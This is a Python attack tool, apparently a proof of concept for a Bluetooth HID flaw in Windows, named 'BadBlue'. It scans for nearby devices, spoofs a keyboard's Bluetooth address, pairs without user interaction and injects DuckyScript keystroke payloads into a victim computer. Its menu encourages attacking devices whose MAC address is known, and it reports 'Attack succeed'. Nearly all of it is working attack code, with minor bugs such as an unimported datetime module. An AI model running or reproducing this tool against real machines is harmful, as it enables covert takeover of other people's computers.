#!/usr/bin/env python3
from gi.repository import GLib
from pydbus import SessionBus, SystemBus
from multiprocessing import Process
from threading import Thread
from enum import Enum
import argparse, bluetooth, binascii, os, re, sys, time, socket, struct, subprocess, readchar
separator = "=" * 70
def char_to_key_code(char):# Mapping for special characters that always require SHIFT
    shift_char_map = {
        '!': 'EXCLAMATION_MARK',
        '@': 'AT_SYMBOL',
        '#': 'HASHTAG',
        '$': 'DOLLAR',
        '%': 'PERCENT_SYMBOL',
        '^': 'CARET_SYMBOL',
        '&': 'AMPERSAND_SYMBOL',
        '*': 'ASTERISK_SYMBOL',
        '(': 'OPEN_PARENTHESIS',
        ')': 'CLOSE_PARENTHESIS',
        '_': 'UNDERSCORE_SYMBOL',
        '+': 'KEYPADPLUS',
	    '{': 'LEFTBRACE',
	    '}': 'RIGHTBRACE',
	    ':': 'SEMICOLON',
	    '\\': 'BACKSLASH',
	    '"': 'QUOTE',
        '<': 'COMMA',
        '>': 'DOT',
	    '?': 'QUESTIONMARK',
	    'A': 'a',
	    'B': 'b',
	    'C': 'c',
	    'D': 'd',
	    'E': 'e',
	    'F': 'f',
	    'G': 'g',
	    'H': 'h',
	    'I': 'i',
	    'J': 'j',
	    'K': 'k',
	    'L': 'l',
	    'M': 'm',
	    'N': 'n',
	    'O': 'o',
	    'P': 'p',
	    'Q': 'q',
	    'R': 'r',
	    'S': 's',
	    'T': 't',
	    'U': 'u',
	    'V': 'v',
	    'W': 'w',
	    'X': 'x',
	    'Y': 'y',
	    'Z': 'z',
    }
    return shift_char_map.get(char)
class Modifier_Codes(Enum):# Key codes for modifier keys
    CTRL = 0x01
    RIGHTCTRL = 0x10
    SHIFT = 0x02
    RIGHTSHIFT = 0x20
    ALT = 0x04
    RIGHTALT = 0x40
    GUI = 0x08
    WINDOWS = 0x08
    COMMAND = 0x08
    RIGHTGUI = 0x80
class Key_Codes(Enum):#HID bluetooth keycode
    NONE = 0x00
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    _1 = 0x1e
    _2 = 0x1f
    _3 = 0x20
    _4 = 0x21
    _5 = 0x22
    _6 = 0x23
    _7 = 0x24
    _8 = 0x25
    _9 = 0x26
    _0 = 0x27
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    MINUS = 0x2d
    EQUAL = 0x2e
    LEFTBRACE = 0x2f
    RIGHTBRACE = 0x30
    CAPSLOCK = 0x39
    VOLUME_UP = 0x3b
    VOLUME_DOWN = 0xee
    SEMICOLON = 0x33
    COMMA = 0x36
    PERIOD = 0x37
    SLASH = 0x38
    PIPE = 0x31
    BACKSLASH = 0x31
    GRAVE = 0x35
    APOSTROPHE = 0x34
    LEFT_BRACKET = 0x2f
    RIGHT_BRACKET = 0x30
    DOT = 0x37
    RIGHT = 0x4f
    LEFT = 0x50
    DOWN = 0x51
    UP = 0x52
    EXCLAMATION_MARK = 0x1e# SHIFT KEY MAPPING
    AT_SYMBOL = 0x1f
    HASHTAG = 0x20
    DOLLAR = 0x21
    PERCENT_SYMBOL = 0x22
    CARET_SYMBOL = 0x23
    AMPERSAND_SYMBOL = 0x24
    ASTERISK_SYMBOL = 0x25
    OPEN_PARENTHESIS = 0x26
    CLOSE_PARENTHESIS = 0x27
    UNDERSCORE_SYMBOL = 0x2d
    QUOTE = 0x34
    QUESTIONMARK = 0x38
    KEYPADPLUS = 0x57
class ReconnectionRequiredException(Exception):
    def __init__(self, message, current_line=0, current_position=0):
        super().__init__(message)
        time.sleep(2)
        self.current_line = current_line
        self.current_position = current_position
def is_bluetooth_connected():#check any bluetooth plugin
    try:
        output = subprocess.check_output(["hciconfig"], universal_newlines=True)
    except subprocess.CalledProcessError:
        return False
    for line in output.splitlines():
        if line.startswith("hci"):
            return True
    return False
def get_target_address():
    os.system('clear')
    print_fancy_ascii_art()
    print_menu()
    devices = scan_for_devices()
    if devices:# Check if the returned list is from known devices or scanned devices
        if len(devices) == 1 and isinstance(devices[0], tuple) and len(devices[0]) == 2:
        # A single known device was chosen, no need to ask for selection
            print(f"Would you like to enter this device :\n{devices[0][1]} {devices[0][0]} ? (y/n)")
            confirm = readchar.readchar()
            if confirm == 'y':
                return devices[0][0]
            else:
                return
        else:# Show list of scanned devices for user selection
            for idx, (addr, name) in enumerate(devices):
                print(f"{idx + 1}: Device Name: {name}, Address: {addr}")
            selection = int(input("\nSelect a device by number: ")) - 1
            if 0 <= selection < len(devices):
                target_address = devices[selection][0]
            else:
                print("\nInvalid selection. Exiting.")
                return
    else:
        return
    return target_address
def process_duckyscript(client, duckyscript, current_line=0, current_position=0):
    send_keypress(client, '')  # Send empty report to ensure a clean start
    time.sleep(0.5)
    shift_required_characters = "!@#$%^&*()_+{}|:\"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    try:
        for line_number, line in enumerate(duckyscript):
            if line_number < current_line:
                continue  # Skip already processed lines
            if line_number == current_line and current_position > 0:
                line = line[current_position:]  # Resume from the last position within the current line
            else:
                current_position = 0  # Reset position for new line
            line = line.strip()
            print(f"Processing {line}")
            if not line or line.startswith("REM"):#note can be omitted
                continue
            if line.startswith("LEFTARROW"):#idk but LEFT can't send if i don't have it
                send_keypress(client, Key_Codes.LEFT)
            if line.startswith("TAB"):
                send_keypress(client, Key_Codes.TAB)
            if line.startswith("PRIVATE_BROWSER"):#someone use it :v
                report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                send(client, report)
                # Don't forget to send a release report afterwards
                release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                send(client, release_report)
            if line.startswith("DELAY"):
                try:# Extract delay time from the line
                    delay_time = int(line.split()[1])  # Assumes delay time is in milliseconds
                    time.sleep(delay_time / 1000)  # Convert milliseconds to seconds for sleep
                except ValueError:
                    print(f"Invalid DELAY format in line: {line}")
                except IndexError:
                    print(f"DELAY command requires a time parameter in line: {line}")
                continue  # Move to the next line after the delay
            if line.startswith("STRING"):
                text = line[7:]
                for char_position, char in enumerate(text, start=1):
                    print(f"Attempting to send letter: {char}")
                    try:# Process each character
                        if char.isdigit():
                            key_code = getattr(Key_Codes, f"_{char}")
                            send_keypress(client, key_code)
                        elif char == " ":
                            send_keypress(client, Key_Codes.SPACE)
                        elif char == "[":
                            send_keypress(client, Key_Codes.LEFTBRACE)
                        elif char == "]":
                            send_keypress(client, Key_Codes.RIGHTBRACE)
                        elif char == ";":
                            send_keypress(client, Key_Codes.SEMICOLON)
                        elif char == "'":
                            send_keypress(client, Key_Codes.QUOTE)
                        elif char == "/":
                            send_keypress(client, Key_Codes.SLASH)
                        elif char == ".":
                            send_keypress(client, Key_Codes.DOT)
                        elif char == ",":
                            send_keypress(client, Key_Codes.COMMA)
                        elif char == "|":
                            send_keypress(client, Key_Codes.PIPE)
                        elif char == "-":
                            send_keypress(client, Key_Codes.MINUS)
                        elif char == "=":
                            send_keypress(client, Key_Codes.EQUAL)
                        elif char in shift_required_characters:
                            key_code_str = char_to_key_code(char)
                            if key_code_str:
                                key_code = getattr(Key_Codes, key_code_str)
                                send_keyboard_combination(client, Modifier_Codes.SHIFT, key_code)
                            else:
                                print(f"Unsupported character '{char}' in Duckyscript")
                        elif char.isalpha():
                            key_code = getattr(Key_Codes, char.lower())
                            if char.isupper():
                                send_keyboard_combination(client, Modifier_Codes.SHIFT, key_code)
                            else:
                                send_keypress(client, key_code)
                        else:
                            key_code = char_to_key_code(char)
                            if key_code:
                                send_keypress(client, key_code)
                            else:
                                print(f"Unsupported character '{char}' in Duckyscript")
                        current_position = char_position
                    except AttributeError as e:
                        print(f"Attribute error: {e} - Unsupported character '{char}' in Duckyscript")
            elif any(mod in line for mod in ["SHIFT", "ALT", "CTRL", "GUI", "COMMAND", "WINDOWS"]):
                components = line.split()# Process modifier key combinations
                if len(components) == 2:
                    modifier, key = components
                    try:# Convert to appropriate enums
                        modifier_enum = getattr(Modifier_Codes, modifier.upper())
                        key_enum = getattr(Key_Codes, key.lower())
                        send_keyboard_combination(client, modifier_enum, key_enum)
                        print(f"Sent combination: {line}")
                    except AttributeError:
                        print(f"Unsupported combination: {line}")
                else:
                    print(f"Invalid combination format: {line}")
            elif line.startswith("ENTER"):
                send_keypress(client, Key_Codes.ENTER)
            current_position = 0# After processing each line, reset current_position to 0 and increment current_line
            current_line += 1  
    except ReconnectionRequiredException:
        raise ReconnectionRequiredException("Reconnection required", current_line, current_position)
    except Exception as e:
        print(f"Error during script execution: {e}")
def send_keyboard_report(self, *args):
    self.send(encode_keyboard_input(*args))
def send_keypress(self, *args, delay=0.0001):
    if args:
        print(f"Attempting to send... {args}")
        self.send(encode_keyboard_input(*args))
        time.sleep(delay)
        self.send(encode_keyboard_input())# Send an empty report to release the key
        time.sleep(delay)
    else:# If no arguments, send an empty report to release keys
        self.send(encode_keyboard_input())
    time.sleep(delay)
    return True  # Indicate successful send
def send_keyboard_combination(self, modifier, key, delay=0.0001):# Press the combination 004
    press_report = encode_keyboard_input(modifier, key)
    self.send(press_report)
    time.sleep(delay)  # Delay to simulate key press
    release_report = encode_keyboard_input()# Release the combination
    self.send(release_report)
    time.sleep(delay)
def send(self, data):#send key via TX
    if not self.connected:
        print("[TX] Not connected")
        self.reconnect()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]# Get the current timestamp
    # Add the timestamp to your log message
    print(f"[{timestamp}][TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
    try:
        self.attempt_send(data)
        print(f"[TX-{self.port}] Data sent successfully")
    except bluetooth.btcommon.BluetoothError as ex:
        print(f"[TX-{self.port}] Bluetooth error: {ex}")
        self.reconnect()
        self.send(data)  # Retry sending after reconnection
    except Exception as ex:
        print(f"[TX-{self.port}] Exception: {ex}")
        raise
def attempt_send(self, data, timeout=0.5):
    start = time.time()
    while time.time() - start < timeout:
        try:
            self.sock.send(data)
            return
        except bluetooth.btcommon.BluetoothError as ex:
            if ex.errno != 11:  # no data available
                raise
            time.sleep(0.001)
def encode_keyboard_input(*args):
    keycodes = []
    flags = 0
    for a in args:
        if isinstance(a, Key_Codes):
            keycodes.append(a.value)
        elif isinstance(a, Modifier_Codes):
            flags |= a.value
    assert(len(keycodes) <= 7)
    keycodes += [0] * (7 - len(keycodes))
    report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
    return report
def read_duckyscript(filename):# Function to read DuckyScript from file
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return [line.strip() for line in file.readlines()]
    else:
        print(f"File {filename} not found. Skipping DuckyScript.")
        return None
def is_valid_mac_address(mac_address):# Regular expression to match a MAC address in the form XX:XX:XX:XX:XX:XX
    mac_address_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return mac_address_pattern.match(mac_address) is not None
def print_fancy_ascii_art():#you can change to anything, but i love my name :))
    ascii_art = """
         _____  _    _ _    _  _____ _    _         _    _    
        |  __ \| |  | | |  | |/ ____| |  | |   /\  | |  | |   
        | |__) | |__| | |  | | |    | |__| |  /  \ | |  | |   
        |  ___/|  __  | |  | | |    |  __  | / /\ \| |  | |   
        | |    | |  | | |__| | |____| |  | |/ ____ \ |__| |   
        |_|___ |_|__|_|\____/ \_____|_|__|_/_/    \_\____/_   
        |  __ \ / __ \ / ____|       / ____\ \    / /  ____|  
        | |__) | |  | | |           | |     \ \  / /| |__     
        |  ___/| |  | | |           | |      \ \/ / |  __|    
        | |    | |__| | |____       | |____   \  /  | |____   
        |_|_   _\____/ \_____|      _\_____|___\/  _|______|  
        |__ \ / _ \__ \| || |      |__ \/_ |___ \ / _ \  / /  
           ) | | | | ) | || |_ ______ ) || | __) | | | |/ /_  
          / /| | | |/ /|__   _|______/ / | ||__ <| | | | '_ \ 
         / /_| |_| / /_   | |       / /_ | |___) | |_| | (_) |
        |____|\___/____|  |_|      |____||_|____/ \___/ \___/ ⠀⠀⠀⠀⠀⠀⠀⠀"""
    print("\033[1;36m" + ascii_art + "\033[0m")  # Cyan color
def print_menu():
    title = "BadBlue - Windows Bluetooth Device Attacker"
    print("\033[1;35m" + separator)  # Purple color for separator
    print("\033[1;33m" + title.center(len(separator)))  # Yellow color for title
    print("\033[1;35m" + separator + "\033[0m")  # Purple color for separator
    print("\033[1;32m" + "Remember, you can still attack devices without visibility..." + "\033[0m")
    print("\033[1;32m" + "If you have their MAC address" + "\033[0m")
    print("\033[1;35m" + separator + "\033[0m")  # Purple color for separator
def run_agent():#set no input output for your bluetooth
    class Agent(object):
      """<node><interface name='org.bluez.Agent1'></interface></node>"""
    loop = GLib.MainLoop()
    SessionBus().publish("test.agent", Agent())
    bluez = SystemBus().get("org.bluez")
    bluez.RegisterAgent("/test/agent", "NoInputNoOutput")
    bluez.RequestDefaultAgent("/test/agent")
    print("'NoInputNoOutput' pairing-agent running")
    loop.run()
def save_devices_to_file(devices, filename='known_devices.txt'):
    with open(filename, 'w') as file:
        for addr, name in devices:
            file.write(f"{addr},{name}\n")
def load_known_devices(filename='known_devices.txt'):
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return [tuple(line.strip().split(',')) for line in file]
    else:
        return []
def scan_for_devices():
    os.system('clear')
    print_fancy_ascii_art()
    print_menu()
    known_devices = load_known_devices()# Load known devices
    device_list = []
    if known_devices:
        text = "Known devices"
        print("\033[1;33m" + text.center(len(separator)) + "\033[0m")
        for idx, (addr, name) in enumerate(known_devices):
            print(f"{idx + 1}: Device Name: {name}, Address: {addr}")
        print("\033[1;35m" + separator  + "\033[0m")
        print("What is the target address? Leave blank and I will scan for you: ")
        use_known_device = input("Or you want to use one of these known devices? (yes/no/MAC): ")
        if is_valid_mac_address(use_known_device):
            device_list.append((use_known_device, 'Victim'))
            return device_list
        elif use_known_device.lower() == 'yes' or use_known_device.lower() == 'y':
            device_choice = int(input("Enter the number of the device: "))
            return [known_devices[device_choice - 1]]
        elif use_known_device.lower() == 'no' or use_known_device.lower() == 'n':
            print("\033[1;31m" + "\nWelcome to the world of good people." + "\033[0m")
            return
    print("\nAttempting to scan now...")# Normal Bluetooth scan
    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=True)
    if len(nearby_devices) == 0:
        print("\033[1;31m" + "\nNo nearby devices found." + "\033[0m")
    else:
        print("\nFound {} nearby device(s):".format(len(nearby_devices)))
        for idx, (addr, name, _) in enumerate(nearby_devices):
            device_list.append((addr, name))
    # Save the scanned devices only if they are not already in known devices
    new_devices = [device for device in device_list if device not in known_devices]
    if new_devices:
        known_devices += new_devices
        save_devices_to_file(known_devices)
        for idx, (addr, name) in enumerate(new_devices):
            print(f"{idx + 1}: Device Name: {name}, Address: {addr}")
    return device_list
def reset(client, agent_proc, c17):#reset bluetooth
    os.system("sudo bdaddr -i %s 12:34:56:78:9A:BC" % args.interface)#reset bluetooth card
    os.system("sudo hciconfig %s reset" % args.interface)
    agent_proc.kill()#close all chill process
    client.close()
    c17.close()
    agent_proc.kill()#close all chill process
    sys.exit(0)
def windows(args):
    os.system("sudo bdaddr -i %s %s" % (args.interface, args.keyboard))# adopt the Bluetooth address of the target keyboard
    os.system("sudo hciconfig %s reset" % args.interface)
    os.system("sudo hciconfig %s up" % args.interface)
    res = subprocess.check_output(["hciconfig", args.interface])
    addr = res.decode().split("\n")[1].split("BD Address: ")[1].split(" ")[0]
    if addr != args.keyboard:
        print("Error setting Bluetooth address, aborting!")
        sys.exit(1)
    os.system("sudo hciconfig %s name Keyboard" % args.interface)# assign a generic BT-keyboard device-name and class id
    os.system("sudo hciconfig %s class 0x002540" % args.interface)
    os.system("sudo sdptool add KEYB")# add the BT-HID SDP profile (HID control and HID interrupt)
    agent_proc = Process(target=run_agent)# start a 'NoInputNoOutput' pairing agent
    agent_proc.start()
    time.sleep(0.25)
    os.system("sudo btmgmt -i %s ssp on" % args.interface)# enable SSP (secure simple pairing)
    sys.stdout.write("\033[F")
    print("successfully enable SSP (secure simple pairing)                                               ")
    client = bluetooth.BluetoothSocket(bluetooth.L2CAP)# connect to HID-interrupt
    while True:# make connection attempts to HID-control until successful
        try:
            c17 = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            print("Connecting to PSM 17")
            c17.connect((args.computer, 17))
            sys.stdout.write("\033[F")
            print("Successfully connected to PSM 17 (HID Control)")
            break
        except Exception as ex:
            print("Error connecting to PSM 17:", str(ex))
            sys.stdout.write("\033[F")
            sys.stdout.write("\033[F")
            time.sleep(0.05)
    print("Connecting to PSM 19")
    client.connect((args.computer, 19))
    sys.stdout.write("\033[F")
    print("Successfully connected to PSM 19 (HID Interrupt)                        ")
    print("\033[1;35m" + separator + "\033[0m")
    return client, agent_proc, c17
if __name__ == "__main__":
    if is_bluetooth_connected() == False:
        print("\033[1;31m" + "\nNo Bluetooth devices found." + "\033[0m")
        sys.exit(1)
    parser = argparse.ArgumentParser(description='Keystroke Injection POC')#setting argument
    parser.add_argument('-i', '--interface', type=str, default='hci0', help='Bluetooth controller (default: hci0)')
    parser.add_argument('-k', '--keyboard', type=str, default='F4:73:35:7A:4B:BB', help='Bluetooth address of target keyboard')
    parser.add_argument('-c', '--computer', type=str, default='', help='Bluetooth address of target computer')
    args = parser.parse_args()
    #args.computer = get_target_address()
    while True:
        args.computer = get_target_address()
        if args.computer:
            break  # Exit the loop when an address is found
        else:
            print("\033[1;34m" + "Press any key to rescan or press 0 to exit. " + "\033[0m")
            key = readchar.readchar()
            if key == '0':
                print("Exit...")
                sys.exit(0)    
    assert(re.fullmatch(r"hci\d+", args.interface))#format input
    assert(re.fullmatch(r"([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}", args.keyboard))
    assert(re.fullmatch(r"([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}", args.computer))
    client, agent_proc, c17 = windows(args)
    script_directory = os.path.dirname(os.path.realpath(__file__))
    payload_folder = os.path.join(script_directory, 'payloads/')  # Specify the relative path to the payloads folder.
    payloads = os.listdir(payload_folder)
    text = "Available payloads"
    print("\033[1;33m" + text.center(len(separator)) + "\033[0m")
    for idx, payload_file in enumerate(payloads, 1): # Check and enumerate the files inside the payload folder.
        print(f"{idx}: {payload_file}")
    print("\033[1;35m" + separator + "\033[0m")
    payload_choice = input("Enter the number of the payload you want to load: ")
    if payload_choice == '0':
        print("\033[1;31m" + "\nWelcome to the world of good people." + "\033[0m")
        reset(client, agent_proc, c17)
    selected_payload = None
    try:#select payload
        payload_index = int(payload_choice) - 1
        selected_payload = os.path.join(payload_folder, payloads[payload_index])
    except (ValueError, IndexError):
        print("Invalid payload choice. No payload selected.")
    if selected_payload is not None:
        print(f"Selected payload: {selected_payload}")
        duckyscript = read_duckyscript(selected_payload)
    else:
        print("No payload selected.")
    current_line = 0
    current_position = 0
    process_duckyscript(client, duckyscript, current_line, current_position)#start send payload
    print("\033[1;33m" + "\nAttack succeed. Press Any Key To Exit" + "\033[0m")
    k = readchar.readchar()
    reset(client, agent_proc, c17)
